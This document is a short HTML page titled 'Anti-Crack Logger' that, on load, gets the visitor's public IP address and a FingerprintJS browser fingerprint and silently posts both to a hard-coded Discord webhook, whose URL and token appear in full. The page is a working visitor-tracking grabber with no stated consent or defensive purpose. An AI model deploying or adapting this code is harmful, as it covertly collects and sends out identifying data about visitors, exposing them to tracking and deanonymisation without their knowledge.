<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Anti-Crack Logger</title>
  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
  <style>
    body {
      background: #0d0d0d;
      color: #00ff88;
      font-family: monospace;
      text-align: center;
      padding-top: 10%;
    }
  </style>
</head>
<body>
  <h1>Scanning for environment data...</h1>
  <p id="log">Loading...</p>

  <script>
    const webhook = "https://discord.com/api/webhooks/1362204715005251675/i7o9dGLluaS1H95w6r3-vkHs07wVhccFVY1PrXZA_lc0Hp8zhSTyaJDYleTasWDaO3aE";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Unknown IP";
      }
    }

    async function getFingerprint() {
      const fp = await FingerprintJS.load();
      const result = await fp.get();
      return result.visitorId;
    }

    async function logData() {
      const ip = await getIP();
      const fingerprint = await getFingerprint();

      document.getElementById("log").innerText = `IP: ${ip}\nFingerprint: ${fingerprint}`;

      const payload = {
        content: `üîê **Web Logger**\nüåê IP: \`${ip}\`\nüß† Fingerprint: \`${fingerprint}\``
      };

      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    logData();
  </script>
</body>
</html>
